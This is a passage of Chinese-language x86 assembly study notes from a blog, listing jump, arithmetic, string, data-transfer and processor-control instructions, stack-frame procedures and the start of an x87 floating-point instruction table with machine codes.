zf&#x3D;1&#x2F;&#x2F;clc将CF清0&#x2F;&#x2F;stc将CF置1数字1与数字符号1，对于后者存在计算机中使用的是它的ASCII代码31hA41ha   61h特定标志位跳转jz为零跳转ZF&#x3D;1jnzjc进位跳转CF&#x3D;1jncjo溢出跳转OF&#x3D;1jnojs有符号跳转SF&#x3D;1jnsjp偶校验跳转PF&#x3D;1jnpje相等跳转jne不相等跳转jcxz cx&#x3D;0跳转jecxz ecx&#x3D;0跳转jrcxz rcx&#x3D;0跳转    无符号数比较跳转(a在b前面，a是大于，e表示等于)ja大于跳转（leftnum&gt;rightnum）jnbe不小于等于跳转jae大于等于跳转jnb不小于跳转jb小于跳转jnae不大于等于跳转jbe小于等于跳转jna不大于跳转有符号数比较跳转(G在L前面，G是大于，E表示等于)JG大于跳转（leftnum&gt;rightnum）JNLE不小于等于跳转JGE大于等于跳转JNL不小于JL小于跳转JNGE不大于等于JLE小于等于JNG不大于loopz&#x2F;loopeecx不等于0并且ZF标志位为1时跳转，即与LOOP指令不同的地方就是要同时判别ZF标志位ZF&#x3D;1，其他和loop一样loopnz&#x2F;loopneZF&#x3D;0，其他和loop一样<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-整数算术指令"><a href="#7-整数算术指令" class="headerlink" title="7.整数算术指令"></a>7.整数算术指令</h2><pre class="line-numbers language-none"><code class="language-none">SHL逻辑左移（无符号）SHR逻辑右移SAL算术左移（有符号）SAR算术右移ROL循环左移ROR循环右移RCL带进位的循环左移RCR带进位的循环右移&#x2F;&#x2F;SHLD双精度左移&#x2F;&#x2F;SHRD双精度右移    MUL(无符号乘法)被乘数乘数乘积ALreg&#x2F;mem8AXAXreg&#x2F;mem16DX:AXEAXreg&#x2F;mem32EDX:EAXIMUL(有符号乘法)单操作数如果结果的高一半不是低一半的符号扩展，OF，CF置位双操作数两个操作数相乘，结果存到第一个操作数中，如果第一个操作数存不下结果，OF、CF置位。三操作数第二、三两个操作数相乘，结果存到第一个操作数中如果第一个操作数存不下结果，OF、CF置位DIV(无符号除法)被除数除数商余数AXreg&#x2F;mem8ALAHDX:AXreg&#x2F;mem16AXDXEDX:EAXreg&#x2F;mem32EAXEDXIDIV(有符号除法)与无符号除法几乎一样，但是进行除法前要对被除数进行符号拓展CBW字节转字 AL拓展到AHCWD字转双字 AX拓展到DXCDQ双字转四字 EAX拓展到EDX拓展加减法ADC带进位加法SBB带借位减法（无需了解调整指令）算术调整指令（第一个字母A，ASCALL调整&#x2F;D,十进制调整，第二个字母A表示调整）AAAAASAADAAMDAADAS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8-高级过程"><a href="#8-高级过程" class="headerlink" title="8.高级过程"></a>8.高级过程</h2><pre class="line-numbers language-none"><code class="language-none">LEA返回间接操作数的地址INVOKEcall指令的增强版，支持堆栈参数传递Invoke DumpMem,offset array,lengthof array这条指令的实际效果(指令顺序与语言选项有关)Push lengthof arrayPush offset arrayCall DumpMem&#x2F;&#x2F;ENTER 为方便建立堆栈框架的指令 ENTER 8,0      Push ebp Mov ebp , espSub esp , 8&#x2F;&#x2F;LEAVE   与ENTER配合LEAVEMov esp,ebpPop ebp&#x2F;&#x2F;LOCAL可定义全局变量Local var1:byte 定义一个名为var1的字节变量Local v1:dword,v2:byte 定义了两个变量Local arr[10]:dword  定义数组&#x2F;&#x2F;PROTO声明过程原型Ø 掌握堆栈框架(Stack Frame)的使用：栈框架的建立，栈的清理，要求能画出栈在调用一个过程中的变化情况；Ø 理解通过栈传递参数的原理，能结合EBP来计算参数的位置Ø 理解C调用约写与stdcall调用约定的不同点与相同点Ø 理解如何在过程中使用局量变量Ø 掌握LEA指令Ø 了解ENTER、LEAVE指令Ø 了解Local伪指令Ø 掌握invoke伪指令的使用，理解它是如何转换为call指令的。Ø 了解proto伪指令。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="9-串操作"><a href="#9-串操作" class="headerlink" title="9.串操作"></a>9.串操作</h2><pre class="line-numbers language-none"><code class="language-none">CLD DF&#x3D;0  DS:SI 源串段寄存器 :源串变址.            ES:DI 目标串段寄存器:目标串变址.            CX 重复次数计数器.            AL&#x2F;AX 扫描值.            D标志   0表示重复操作中SI和DI应自动增量; 1表示应自动减量.            Z标志   用来控制扫描或比较操作的结束.  MOVS    串传送.(相当于mov [edi],[esi])( MOVSB 传送字符. MOVSW 传送字. MOVSD 传送双字. )  CMPS    串比较.(相当于cmp [esi],[edi])( CMPSB 比较字符. CMPSW 比较字. )  SCAS    串扫描.把AL或AX的内容与目标串作比较,比较结果反映在标志位.  LODS    装入串.把源串中的元素(字或字节)逐一装入AL或AX中.( LODSB 传送字符. LODSW 传送字.    LODSD 传送双字. )  STOS    保存串.是LODS的逆过程.  REP         当CX&#x2F;ECX&lt;&gt;0时重复.(&lt;&gt; &#x3D;&#x3D; !&#x3D; ) REPE&#x2F;REPZ   当ZF&#x3D;1或比较结果相等,且CX&#x2F;ECX&lt;&gt;0时重复.  REPNE&#x2F;REPNZ 当ZF&#x3D;0或比较结果不相等,且CX&#x2F;ECX&lt;&gt;0时重复.  REPC        当CF&#x3D;1且CX&#x2F;ECX&lt;&gt;0时重复.  REPNC       当CF&#x3D;0且CX&#x2F;ECX&lt;&gt;0时重复.  基址变址寻址.data  arr word 1000h,2000h,3000h.code  mov ebx , offset arr  mov esi , 2  mov ax , [ebx + esi]  ;ax &#x3D; 2000h  mov ecx , 4  mov ax , [ebx + ecx] ; ax &#x3D; 3000h相对基址变址寻址mov ecx , tableB[ebx,eax*2]了解比例因子mov al , [eax + ebx * 4]1,2,4,8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="10-结构和宏"><a href="#10-结构和宏" class="headerlink" title="10.结构和宏"></a>10.结构和宏</h2><pre class="line-numbers language-objectivec" data-language="objectivec"><code class="language-objectivec">定义结构    结构名   <span class="token keyword">struct</span>各域的声明结构名 endsØ 本章内容未讲，无需复习。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="一、数据传输指令"><a href="#一、数据传输指令" class="headerlink" title="一、数据传输指令"></a>一、数据传输指令</h2><p>网上抄的，别骂了别骂了 </p><p>它们在存贮器和寄存器、寄存器和输入输出端口之间传送数据.</p><h3 id="1-通用数据传送指令"><a href="#1-通用数据传送指令" class="headerlink" title="1. 通用数据传送指令"></a>1. 通用数据传送指令</h3><pre class="line-numbers language-objectivec" data-language="objectivec"><code class="language-objectivec">MOV     传送字或字节<span class="token punctuation">.</span>  MOVSX   先符号扩展<span class="token punctuation">,</span>再传送<span class="token punctuation">.</span>MOVZX   先零扩展<span class="token punctuation">,</span>再传送<span class="token punctuation">.</span>  PUSH    把字压入堆栈<span class="token punctuation">.</span>  POP     把字弹出堆栈<span class="token punctuation">.</span>  PUSHA   把AX<span class="token punctuation">,</span>CX<span class="token punctuation">,</span>DX<span class="token punctuation">,</span>BX<span class="token punctuation">,</span>SP<span class="token punctuation">,</span>BP<span class="token punctuation">,</span>SI<span class="token punctuation">,</span>DI依次压入堆栈<span class="token punctuation">.</span>  POPA    把DI<span class="token punctuation">,</span>SI<span class="token punctuation">,</span>BP<span class="token punctuation">,</span>SP<span class="token punctuation">,</span>BX<span class="token punctuation">,</span>DX<span class="token punctuation">,</span>CX<span class="token punctuation">,</span>AX依次弹出堆栈<span class="token punctuation">.</span>  PUSHAD  把EAX<span class="token punctuation">,</span>ECX<span class="token punctuation">,</span>EDX<span class="token punctuation">,</span>EBX<span class="token punctuation">,</span>ESP<span class="token punctuation">,</span>EBP<span class="token punctuation">,</span>ESI<span class="token punctuation">,</span>EDI依次压入堆栈<span class="token punctuation">.</span>  POPAD   把EDI<span class="token punctuation">,</span>ESI<span class="token punctuation">,</span>EBP<span class="token punctuation">,</span>ESP<span class="token punctuation">,</span>EBX<span class="token punctuation">,</span>EDX<span class="token punctuation">,</span>ECX<span class="token punctuation">,</span>EAX依次弹出堆栈<span class="token punctuation">.</span>  BSWAP   交换<span class="token number">32</span>位寄存器里字节的顺序  XCHG    交换字或字节<span class="token punctuation">.</span><span class="token punctuation">(</span>至少有一个操作数为寄存器<span class="token punctuation">,</span>段寄存器不可作为操作数<span class="token punctuation">)</span>  CMPXCHG 比较并交换操作数<span class="token punctuation">.</span><span class="token punctuation">(</span>第二个操作数必须为累加器AL<span class="token operator">/</span>AX<span class="token operator">/</span>EAX<span class="token punctuation">)</span>  XADD    先交换再累加<span class="token punctuation">.</span><span class="token punctuation">(</span>结果在第一个操作数里<span class="token punctuation">)</span>  XLAT    字节查表转换<span class="token punctuation">.</span><span class="token operator">--</span><span class="token operator">--</span>BX指向一张<span class="token number">256</span>字节的表的起点<span class="token punctuation">,</span>AL为表的索引值<span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">255</span><span class="token punctuation">,</span>即<span class="token number">0</span><span class="token operator">-</span>FFH<span class="token punctuation">)</span><span class="token punctuation">;</span>返回AL为查表结果<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token punctuation">[</span>BX<span class="token operator">+</span>AL<span class="token punctuation">]</span><span class="token operator">-></span>AL<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-输入输出端口传送指令"><a href="#2-输入输出端口传送指令" class="headerlink" title="2. 输入输出端口传送指令."></a>2. 输入输出端口传送指令.</h3><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">IN      I&#x2F;O端口输入. ( 语法: IN   累加器,    &#123;端口号│DX&#125; )  OUT     I&#x2F;O端口输出. ( 语法: OUT &#123;端口号│DX&#125;,累加器 )输入输出端口由立即方式指定时,    其范围是 0-255; 由寄存器 DX 指定时,其范围是    0-65535.  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-目的地址传送指令"><a href="#3-目的地址传送指令" class="headerlink" title="3. 目的地址传送指令."></a>3. 目的地址传送指令.</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">LEA     装入有效地址<span class="token punctuation">.</span>例<span class="token operator">:</span> LEA DX<span class="token punctuation">,</span>string <span class="token punctuation">;</span>把偏移地址存到DX<span class="token punctuation">.</span>  LDS     传送目标指针<span class="token punctuation">,</span>把指针内容装入DS<span class="token punctuation">.</span>例<span class="token operator">:</span> LDS SI<span class="token punctuation">,</span>string   <span class="token punctuation">;</span>把段地址<span class="token operator">:</span>偏移地址存到DS<span class="token operator">:</span>SI<span class="token punctuation">.</span>  LES     传送目标指针<span class="token punctuation">,</span>把指针内容装入ES<span class="token punctuation">.</span>例<span class="token operator">:</span> LES DI<span class="token punctuation">,</span>string   <span class="token punctuation">;</span>把段地址<span class="token operator">:</span>偏移地址存到ES<span class="token operator">:</span>DI<span class="token punctuation">.</span>  LFS     传送目标指针<span class="token punctuation">,</span>把指针内容装入FS<span class="token punctuation">.</span>例<span class="token operator">:</span> LFS DI<span class="token punctuation">,</span>string   <span class="token punctuation">;</span>把段地址<span class="token operator">:</span>偏移地址存到FS<span class="token operator">:</span>DI<span class="token punctuation">.</span>  LGS     传送目标指针<span class="token punctuation">,</span>把指针内容装入GS<span class="token punctuation">.</span>例<span class="token operator">:</span> LGS DI<span class="token punctuation">,</span>string   <span class="token punctuation">;</span>把段地址<span class="token operator">:</span>偏移地址存到GS<span class="token operator">:</span>DI<span class="token punctuation">.</span>  LSS     传送目标指针<span class="token punctuation">,</span>把指针内容装入SS<span class="token punctuation">.</span>例<span class="token operator">:</span> LSS DI<span class="token punctuation">,</span>string   <span class="token punctuation">;</span>把段地址<span class="token operator">:</span>偏移地址存到SS<span class="token operator">:</span>DI<span class="token punctuation">.</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-标志传送指令"><a href="#4-标志传送指令" class="headerlink" title="4. 标志传送指令."></a>4. 标志传送指令.</h3><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">LAHF    标志寄存器传送,把标志装入AH.  SAHF    标志寄存器传送,把AH内容装入标志寄存器.  PUSHF   标志入栈.  POPF    标志出栈.  PUSHD   32位标志入栈.  POPD    32位标志出栈.  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、算术运算指令"><a href="#二、算术运算指令" class="headerlink" title="二、算术运算指令"></a>二、算术运算指令</h2><pre class="line-numbers language-objectivec" data-language="objectivec"><code class="language-objectivec">ADC     带进位加法<span class="token punctuation">.</span>  INC     加 <span class="token number">1.</span>  AAA     加法的ASCII码调整<span class="token punctuation">.</span>  DAA     加法的十进制调整<span class="token punctuation">.</span>  SUB     减法<span class="token punctuation">.</span>  SBB     带借位减法<span class="token punctuation">.</span>  DEC     减 <span class="token number">1.</span>  NEG     求反<span class="token punctuation">(</span>以    <span class="token number">0</span> 减之<span class="token punctuation">)</span><span class="token punctuation">.</span>  CMP     比较<span class="token punctuation">.</span><span class="token punctuation">(</span>两操作数作减法<span class="token punctuation">,</span>仅修改标志位<span class="token punctuation">,</span>不回送结果<span class="token punctuation">)</span><span class="token punctuation">.</span>  AAS     减法的ASCII码调整<span class="token punctuation">.</span>  DAS     减法的十进制调整<span class="token punctuation">.</span>  MUL     无符号乘法<span class="token punctuation">.</span>结果回送AH和<span class="token function">AL</span><span class="token punctuation">(</span>字节运算<span class="token punctuation">)</span><span class="token punctuation">,</span>或DX和<span class="token function">AX</span><span class="token punctuation">(</span>字运算<span class="token punctuation">)</span><span class="token punctuation">,</span>  IMUL    整数乘法<span class="token punctuation">.</span>结果回送AH和<span class="token function">AL</span><span class="token punctuation">(</span>字节运算<span class="token punctuation">)</span><span class="token punctuation">,</span>或DX和<span class="token function">AX</span><span class="token punctuation">(</span>字运算<span class="token punctuation">)</span><span class="token punctuation">,</span>  AAM     乘法的ASCII码调整<span class="token punctuation">.</span>  DIV     无符号除法<span class="token punctuation">.</span>结果回送<span class="token punctuation">:</span>商回送AL<span class="token punctuation">,</span>余数回送AH<span class="token punctuation">,</span> <span class="token punctuation">(</span>字节运算<span class="token punctuation">)</span><span class="token punctuation">;</span>或 商回送AX<span class="token punctuation">,</span>余数回送DX<span class="token punctuation">,</span> <span class="token punctuation">(</span>字运算<span class="token punctuation">)</span><span class="token punctuation">.</span>  IDIV    整数除法<span class="token punctuation">.</span>结果回送<span class="token punctuation">:</span>商回送AL<span class="token punctuation">,</span>余数回送AH<span class="token punctuation">,</span> <span class="token punctuation">(</span>字节运算<span class="token punctuation">)</span><span class="token punctuation">;</span>或 商回送AX<span class="token punctuation">,</span>余数回送DX<span class="token punctuation">,</span> <span class="token punctuation">(</span>字运算<span class="token punctuation">)</span><span class="token punctuation">.</span>  AAD     除法的ASCII码调整<span class="token punctuation">.</span>  CBW     字节转换为字<span class="token punctuation">.</span> <span class="token punctuation">(</span>把AL中字节的符号扩展到AH中去<span class="token punctuation">)</span>  CWD     字转换为双字<span class="token punctuation">.</span> <span class="token punctuation">(</span>把AX中的字的符号扩展到DX中去<span class="token punctuation">)</span>  CWDE    字转换为双字<span class="token punctuation">.</span> <span class="token punctuation">(</span>把AX中的字符号扩展到EAX中去<span class="token punctuation">)</span>  CDQ     双字扩展<span class="token punctuation">.</span> <span class="token punctuation">(</span>把EAX中的字的符号扩展到EDX中去<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、逻辑运算指令"><a href="#三、逻辑运算指令" class="headerlink" title="三、逻辑运算指令"></a>三、逻辑运算指令</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">AND</span>     与运算<span class="token punctuation">.</span>  <span class="token keyword">OR</span>      或运算<span class="token punctuation">.</span>  <span class="token keyword">XOR</span>     异或运算<span class="token punctuation">.</span>  <span class="token constant">NOT</span>     取反<span class="token punctuation">.</span>  <span class="token constant">TEST</span>    测试<span class="token punctuation">.</span><span class="token punctuation">(</span>两操作数作与运算<span class="token punctuation">,</span>仅修改标志位<span class="token punctuation">,</span>不回送结果<span class="token punctuation">)</span><span class="token punctuation">.</span>  <span class="token constant">SHL</span>     逻辑左移<span class="token punctuation">.</span>  <span class="token constant">SAL</span>     算术左移<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">=</span><span class="token constant">SHL</span><span class="token punctuation">)</span>  <span class="token constant">SHR</span>     逻辑右移<span class="token punctuation">.</span>  <span class="token constant">SAR</span>     算术右移<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">=</span><span class="token constant">SHR</span><span class="token punctuation">)</span>  <span class="token constant">ROL</span>     循环左移<span class="token punctuation">.</span>  <span class="token constant">ROR</span>     循环右移<span class="token punctuation">.</span>  <span class="token constant">RCL</span>     通过进位的循环左移<span class="token punctuation">.</span>  <span class="token constant">RCR</span>     通过进位的循环右移<span class="token punctuation">.</span>            以上八种移位指令<span class="token punctuation">,</span>其移位次数可达<span class="token number">255</span>次<span class="token punctuation">.</span>            移位一次时<span class="token punctuation">,</span> 可直接用操作码<span class="token punctuation">.</span> 如 <span class="token constant">SHL</span> <span class="token constant">AX</span><span class="token punctuation">,</span><span class="token number">1.</span>            移位<span class="token operator">></span><span class="token number">1</span>次时<span class="token punctuation">,</span> 则由寄存器<span class="token constant">CL</span>给出移位次数<span class="token punctuation">.</span>            如 <span class="token constant">MOV</span> <span class="token constant">CL</span><span class="token punctuation">,</span><span class="token number">04</span>   <span class="token constant">SHL</span> <span class="token constant">AX</span><span class="token punctuation">,</span><span class="token constant">CL</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、串指令"><a href="#四、串指令" class="headerlink" title="四、串指令"></a>四、串指令</h2><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">          DS:SI 源串段寄存器 :源串变址.            ES:DI 目标串段寄存器:目标串变址.            CX 重复次数计数器.            AL/AX 扫描值.            D标志   0表示重复操作中SI和DI应自动增量; 1表示应自动减量.            Z标志   用来控制扫描或比较操作的结束.  MOVS    串传送.( MOVSB 传送字符. MOVSW 传送字. MOVSD 传送双字. )  CMPS    串比较.( CMPSB 比较字符. CMPSW 比较字. )  SCAS    串扫描.把AL或AX的内容与目标串作比较,比较结果反映在标志位.  LODS    装入串.把源串中的元素(字或字节)逐一装入AL或AX中.( LODSB 传送字符. LODSW 传送字.    LODSD 传送双字. )  STOS    保存串.是LODS的逆过程.  REP         当CX/ECX&lt;>0时重复.  REPE/REPZ   当ZF=1或比较结果相等,且CX/ECX&lt;>0时重复.  REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX&lt;>0时重复.  REPC        当CF=1且CX/ECX&lt;>0时重复.  REPNC       当CF=0且CX/ECX&lt;>0时重复.  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、程序转移指令"><a href="#五、程序转移指令" class="headerlink" title="五、程序转移指令"></a>五、程序转移指令</h2><h3 id="1-无条件转移指令-长转移"><a href="#1-无条件转移指令-长转移" class="headerlink" title="1. 无条件转移指令 (长转移)"></a>1. 无条件转移指令 (长转移)</h3><pre class="line-numbers language-objectivec" data-language="objectivec"><code class="language-objectivec">JMP         无条件转移指令  CALL        过程调用  RET<span class="token operator">/</span>RETF    过程返回<span class="token punctuation">.</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-条件转移指令-短转移-128到-127的距离内-当且仅当-SF-XOR-OF-1时-OP1-lt-OP2"><a href="#2-条件转移指令-短转移-128到-127的距离内-当且仅当-SF-XOR-OF-1时-OP1-lt-OP2" class="headerlink" title="2. 条件转移指令      (短转移,-128到+127的距离内)( 当且仅当(SF XOR OF)=1时,OP1&lt;OP2 )"></a>2. 条件转移指令      (短转移,-128到+127的距离内)( 当且仅当(SF XOR OF)=1时,OP1&lt;OP2 )</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">JA/JNBE     不小于或不等于时转移.  JAE/JNB     大于或等于转移.  JB/JNAE     小于转移.  JBE/JNA     小于或等于转移.      以上四条,测试无符号整数运算的结果<span class="token punctuation">(</span>标志C和Z<span class="token punctuation">)</span>.  JG/JNLE     大于转移.  JGE/JNL     大于或等于转移.  JL/JNGE     小于转移.  JLE/JNG     小于或等于转移.      以上四条,测试带符号整数运算的结果<span class="token punctuation">(</span>标志S,O和Z<span class="token punctuation">)</span>.  JE/JZ       等于转移.  JNE/JNZ     不等于时转移.  JC          有进位时转移.  JNC         无进位时转移.  JNO         不溢出时转移.  JNP/JPO     奇偶性为奇数时转移.  JNS         符号位为 <span class="token string">"0"</span> 时转移.  JO          溢出转移.  JP/JPE      奇偶性为偶数时转移.  JS          符号位为 <span class="token string">"1"</span> 时转移.  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-循环控制指令-短转移"><a href="#3-循环控制指令-短转移" class="headerlink" title="3. 循环控制指令(短转移)"></a>3. 循环控制指令(短转移)</h3><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">LOOP            CX不为零时循环.  LOOPE&#x2F;LOOPZ     CX不为零且标志Z&#x3D;1时循环.  LOOPNE&#x2F;LOOPNZ   CX不为零且标志Z&#x3D;0时循环.  JCXZ            CX为零时转移.  JECXZ           ECX为零时转移.  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-中断指令"><a href="#4-中断指令" class="headerlink" title="4. 中断指令"></a>4. 中断指令</h3><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">INT         中断指令  INTO        溢出中断  IRET        中断返回  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="5-处理器控制指令"><a href="#5-处理器控制指令" class="headerlink" title="5. 处理器控制指令"></a>5. 处理器控制指令</h3><pre class="line-numbers language-objectivec" data-language="objectivec"><code class="language-objectivec">HLT         处理器暂停<span class="token punctuation">,</span>  直到出现中断或复位信号才继续<span class="token punctuation">.</span>  WAIT        当芯片引线TEST为高电平时使CPU进入等待状态<span class="token punctuation">.</span>  ESC         转换到外处理器<span class="token punctuation">.</span>  LOCK        封锁总线<span class="token punctuation">.</span>  NOP         空操作<span class="token punctuation">.</span>  STC         置进位标志位<span class="token punctuation">.</span>  CLC         清进位标志位<span class="token punctuation">.</span>  CMC         进位标志取反<span class="token punctuation">.</span>  STD         置方向标志位<span class="token punctuation">.</span>  CLD         清方向标志位<span class="token punctuation">.</span>  STI         置中断允许位<span class="token punctuation">.</span>  CLI         清中断允许位<span class="token punctuation">.</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、伪指令"><a href="#六、伪指令" class="headerlink" title="六、伪指令"></a>六、伪指令</h2><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token constant">DW</span>          定义字<span class="token punctuation">(</span><span class="token number">2</span>字节<span class="token punctuation">)</span><span class="token punctuation">.</span>  <span class="token constant">PROC</span>        定义过程<span class="token punctuation">.</span>  <span class="token constant">ENDP</span>        过程结束<span class="token punctuation">.</span>  <span class="token constant">SEGMENT</span>     定义段<span class="token punctuation">.</span>  <span class="token constant">ASSUME</span>      建立段寄存器寻址<span class="token punctuation">.</span>  <span class="token constant">ENDS</span>        段结束<span class="token punctuation">.</span>  <span class="token keyword">END</span>         程序结束<span class="token punctuation">.</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="七、处理机控制指令：标志处理指令"><a href="#七、处理机控制指令：标志处理指令" class="headerlink" title="七、处理机控制指令：标志处理指令"></a>七、处理机控制指令：标志处理指令</h2><pre class="line-numbers language-objectivec" data-language="objectivec"><code class="language-objectivec">CLC     进位位置<span class="token number">0</span>指令  CMC     进位位求反指令  STC     进位位置为<span class="token number">1</span>指令  CLD     方向标志置<span class="token number">1</span>指令  STD     方向标志位置<span class="token number">1</span>指令  CLI     中断标志置<span class="token number">0</span>指令  STI     中断标志置<span class="token number">1</span>指令  NOP     无操作  HLT     停机  WAIT    等待  ESC     换码  LOCK    封锁  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="浮点运算指令集"><a href="#浮点运算指令集" class="headerlink" title="浮点运算指令集"></a>浮点运算指令集</h2><h3 id="一、控制指令-带9B的控制指令前缀F变为FN时浮点不检查，机器码去掉9B-—"><a href="#一、控制指令-带9B的控制指令前缀F变为FN时浮点不检查，机器码去掉9B-—" class="headerlink" title="一、控制指令(带9B的控制指令前缀F变为FN时浮点不检查，机器码去掉9B)—-"></a>一、控制指令(带9B的控制指令前缀F变为FN时浮点不检查，机器码去掉9B)—-</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token constant">FINIT</span>                 初始化浮点部件                  机器码  9B <span class="token constant">DB</span> <span class="token constant">E3</span>  <span class="token constant">FCLEX</span>                 清除异常                         机器码  9B <span class="token constant">DB</span> <span class="token constant">E2</span>  <span class="token constant">FDISI</span>                 浮点检查禁止中断                 机器码  9B <span class="token constant">DB</span> <span class="token constant">E1</span>  <span class="token constant">FENI</span>                  浮点检查禁止中断二            机器码  9B <span class="token constant">DB</span> <span class="token constant">E0</span>  <span class="token constant">WAIT</span>                  同步<span class="token constant">CPU</span>和<span class="token constant">FPU</span>                    机器码  9B  <span class="token constant">FWAIT</span>                 同步<span class="token constant">CPU</span>和<span class="token constant">FPU</span>                    机器码  <span class="token constant">D9</span> <span class="token constant">D0</span>  <span class="token constant">FNOP</span>                  无操作                          机器码  <span class="token constant">DA</span> <span class="token constant">E9</span>  <span class="token constant">FXCH</span>                  交换<span class="token constant">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>和<span class="token constant">ST</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                机器码  <span class="token constant">D9</span> <span class="token constant">C9</span>  <span class="token constant">FXCH</span> <span class="token constant">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            交换<span class="token constant">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>和<span class="token constant">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                机器码  <span class="token constant">D9</span> <span class="token class-name">C1iii</span>  <span class="token constant">FSTSW</span> ax              状态字到ax                       机器码  9B <span class="token constant">DF</span> <span class="token constant">E0</span>  <span class="token constant">FSTSW</span>   word ptr mem  状态字到mem                      机器码  9B <span class="token constant">DD</span> mm111mmm  <span class="token constant">FLDCW</span>   word ptr mem  mem到状态字                      机器码  <span class="token constant">D9</span> mm101mmm  <span class="token constant">FSTCW</span>   word ptr mem  控制字到mem                      机器码  9B <span class="token constant">D9</span> mm111mmm    <span class="token constant">FLDENV</span>  word ptr mem  mem到全环境                      机器码  <span class="token constant">D9</span> mm100mmm  <span class="token constant">FSTENV</span>  word ptr mem  全环境到mem                      机器码  9B <span class="token constant">D9</span> mm110mmm  <span class="token constant">FRSTOR</span>  word ptr mem  mem到<span class="token constant">FPU</span>状态                    机器码  <span class="token constant">DD</span> mm100mmm  <span class="token constant">FSAVE</span>   word ptr mem  <span class="token constant">FPU</span>状态到mem                    机器码  9B <span class="token constant">DD</span> mm110mmm    <span class="token constant">FFREE</span> <span class="token constant">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>           标志<span class="token constant">ST</span><span class="token punctuation">(</span>i<span class="token 